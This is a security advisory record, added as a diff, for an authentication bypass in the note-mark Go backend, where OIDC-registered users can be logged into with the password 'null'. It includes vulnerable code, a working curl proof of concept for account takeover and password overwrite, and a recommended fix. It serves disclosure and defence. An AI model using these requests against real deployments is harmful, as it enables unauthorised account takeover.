@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-pxf8-6wqm-r6hh",
+  "modified": "2026-05-05T16:09:38.746875Z",
+  "published": "2026-04-25T23:40:19Z",
+  "aliases": [
+    "CVE-2026-41571"
+  ],
+  "summary": "Note Mark: OIDC-registered users authenticated by submitting password \"null\"",
+  "details": "## Summary\n\n`IsPasswordMatch` in `backend/db/models.go` falls back to a hard-coded `bcrypt(\"null\")` placeholder whenever a user has no stored password. OIDC-registered users are created with an empty password, so anyone who submits `password: \"null\"` to the internal login endpoint receives a valid session for that user. The bypass is unauthenticated and requires no user interaction.\n\n## Details\n\n`backend/db/models.go:36` defines the placeholder hash used by the timing-attack mitigation inside `IsPasswordMatch`:\n\n```go\nvar nullPasswordHash, _ = bcrypt.GenerateFromPassword([]byte(\"null\"), bcrypt.DefaultCost)\n```\n\n`IsPasswordMatch` (`backend/db/models.go:46-58`) substitutes that placeholder when the stored password is empty:\n\n```go\nfunc (u *User) IsPasswordMatch(plainPassword string) bool {\n    var current []byte\n    if len(u.Password) == 0 {\n        // prevent CWE-208\n        current = nullPasswordHash\n    } else {\n        current = u.Password\n    }\n    if err := bcrypt.CompareHashAndPassword(current, []byte(plainPassword)); err == nil {\n        return true\n    }\n    return false\n}\n```\n\nOIDC-registered users are stored with an empty password at `backend/services/auth.go:102-115`:\n\n```go\nreturn db.DB.Transaction(func(tx *gorm.DB) error {\n    user := db.User{\n        Username: username,\n        Password: []byte(\"\"),\n    }\n    // ...\n})\n```\n\nThe internal login endpoint (`POST /api/auth/token`, handled at `backend/services/auth.go:20-54`) calls `IsPasswordMatch` with the caller-supplied password. For any OIDC-only user, `bcrypt.CompareHashAndPassword(nullPasswordHash, []byte(\"null\"))` returns nil, the function returns true, and the server issues a `Auth-Session-Token` cookie.\n\n`EnableInternalLogin` defaults to `true`, and `GET /api/info` discloses both OIDC configuration and internal-login status. `enableAnonymousUserSearch` also defaults to `true`, so an unauthenticated caller enumerates usernames via `GET /api/users/search` before touching the login endpoint.\n\nOnce the session is issued, `PUT /api/users/me/password` accepts `existingPassword: \"null\"` because the same `IsPasswordMatch` routine verifies the existing password. The caller writes a new password onto the OIDC user's row, which locks the legitimate OIDC user out on the next internal-login path.\n\n## Proof of Concept\n\nTested against `note-mark` v0.19.2.\n\nStep 1: Start note-mark pointed at any OIDC provider and set `OIDC__ENABLE_USER_CREATION=true`. The defaults for `ENABLE_INTERNAL_LOGIN` and `ENABLE_ANONYMOUS_USER_SEARCH` do not need to be changed.\n\n```bash\ndocker run -d --name note-mark-poc \\\n  -e OIDC__PROVIDER_NAME=example \\\n  -e OIDC__CLIENT_ID=note-mark \\\n  -e OIDC__CLIENT_SECRET=secret \\\n  -e OIDC__ISSUER_URL=https://your-oidc-provider/ \\\n  -e OIDC__ENABLE_USER_CREATION=true \\\n  -p 8088:8080 ghcr.io/enchant97/note-mark-backend:0.19.2\n```\n\nStep 2: Alice registers via the OIDC flow. `TryCreateNewOidcUser` stores her row with `Password = []byte(\"\")`.\n\nStep 3: Bob confirms the preconditions.\n\n```bash\ncurl -s http://localhost:8088/api/info\n# {\"allowInternalLogin\":true,\"oidcProvider\":\"example\",\"enableAnonymousUserSearch\":true,...}\n```\n\nStep 4: Bob logs in as Alice via the internal endpoint.\n\n```bash\ncurl -i -X POST http://localhost:8088/api/auth/token \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"grant_type\":\"password\",\"username\":\"alice\",\"password\":\"null\"}'\n```\n\nResponse:\n\n```\nHTTP/1.1 204 No Content\nSet-Cookie: Auth-Session-Token=eyJ...; Path=/; HttpOnly; SameSite=Strict\n```\n\nStep 5: Bob uses the cookie to read Alice's account.\n\n```bash\ncurl -b 'Auth-Session-Token=eyJ...' http://localhost:8088/api/users/me\n# {\"id\":\"...\",\"username\":\"alice\",\"name\":\"Alice\"}\n```\n\nStep 6: Bob persists access by writing his own password onto Alice's row.\n\n```bash\ncurl -i -b 'Auth-Session-Token=eyJ...' -X PUT \\\n  http://localhost:8088/api/users/me/password \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"existingPassword\":\"null\",\"newPassword\":\"bob-owns-this-now\"}'\n# HTTP/1.1 204 No Content\n```\n\nAlice's next internal-login attempt fails; her OIDC flow still works, but Bob now holds a second valid credential on the same row.\n\nA companion script that drives all six steps ships at `pocs/poc_014_null_password_bypass.sh`.\n\n## Impact\n\nEvery OIDC-only user on a note-mark deployment with `ENABLE_INTERNAL_LOGIN=true` (the default) is one HTTP request from takeover. Bob reads Alice's private notebooks, her note markdown, and her uploaded assets. He writes, edits, or deletes anything Alice owns. Step 6 grants persistent access and costs Alice her account until the maintainer clears the row by hand.\n\nThe default configuration ships both authentication paths side by side, so any site that turns on OIDC is affected without further misconfiguration on the operator's part.\n\n## Recommended Fix\n\nThe clearest fix rejects the login path for rows with no stored password. Add the check after the user lookup in `GetAccessToken`:\n\n```go\n// backend/services/auth.go:28\nvar user db.User\nif err := db.DB.\n    First(\u0026user, \"username = ?\", username).\n    Select(\"id\", \"password\").Error; err != nil {\n    user.IsPasswordMatch(password) // preserve CWE-208 timing mitigation\n    return core.AccessToken{}, InvalidCredentialsError\n}\n\nif len(user.Password) == 0 {\n    return core.AccessToken{}, InvalidCredentialsError\n}\n\nif !user.IsPasswordMatch(password) {\n    return core.AccessToken{}, InvalidCredentialsError\n}\n```\n\nThe equivalent change belongs in `UpdateUserPassword` at `backend/services/users.go:53-61`, since the same routine verifies `existingPassword` during the persistence step.\n\nReplacing `nullPasswordHash` with a per-instance unguessable plaintext closes the hole too, but relies on the placeholder staying secret:\n\n```go\n// backend/db/models.go:36\nvar nullPasswordHash, _ = bcrypt.GenerateFromPassword([]byte(uuid.NewString()), bcrypt.DefaultCost)\n```\n\nThe explicit empty-password check is preferable because the intent is readable in the source.\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/enchant97/note-mark/backend",
+        "purl": "pkg:golang/github.com/enchant97/note-mark/backend"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260417132909-dea5530cc989"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-pxf8-6wqm-r6hh/GHSA-pxf8-6wqm-r6hh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/enchant97/note-mark/security/advisories/GHSA-pxf8-6wqm-r6hh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/enchant97/note-mark/commit/dea5530cc9891187b51548ef9f2868b7dc9f4e92"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/enchant97/note-mark"
+    }
+  ]
+}
